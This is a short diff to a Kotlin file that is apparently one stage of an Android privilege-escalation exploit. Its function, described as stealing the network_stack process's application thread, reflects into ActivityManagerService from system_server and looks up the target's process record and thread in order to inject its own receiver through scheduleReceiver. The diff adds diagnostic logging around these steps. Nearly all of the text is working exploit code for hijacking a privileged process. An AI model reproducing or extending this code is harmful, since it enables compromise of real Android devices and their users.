@@ -31,6 +31,7 @@ object StageHop {
     /** Steal network_stack's IApplicationThread and bounce our StageReceiver there. */
     fun hopToNetworkStack(context: Context): String {
         val log = StringBuilder()
+        Diagnostics.processIdentity(context, "system_server", log)
         try {
             val appInfo = context.packageManager.getApplicationInfo(context.packageName, 0)
             log.appendLine("[*] appInfo=$appInfo")
@@ -47,14 +48,17 @@ object StageHop {
             log.appendLine("[*] got ActivityManagerService")
             val amsClass = ams.javaClass.classLoader!!
                 .loadClass("com.android.server.am.ActivityManagerService")
+            Diagnostics.dumpAmsShape(ams, amsClass, log)  // Gate C.1
             // ProcessRecord lookup, tolerant to per-build signature drift
             // (e.g. getProcessRecordLocked(String,int) vs (String,int,boolean)).
             val pr = findProcessRecord(ams, amsClass, log)
                 ?: throw RuntimeException("networkstack ProcessRecord not found (is it running?)")
             log.appendLine("[*] networkstack ProcessRecord=$pr")
             log.appendLine("[*] pr class=${pr.javaClass.name}")
+            Diagnostics.dumpProcessRecordShape(pr, log)  // Gate C.2
             val thread = findAppThread(pr, log)
                 ?: throw RuntimeException("oneway thread not found (see *hread* candidates above)")
+            Diagnostics.dumpAppThreadShape(thread, log)  // Gate C.3
             // scheduleReceiver(Intent, ActivityInfo, CompatibilityInfo, int, String,
             //   Bundle, boolean, boolean, int, int, int, String) — 12 params.
             val m = thread.javaClass.methods
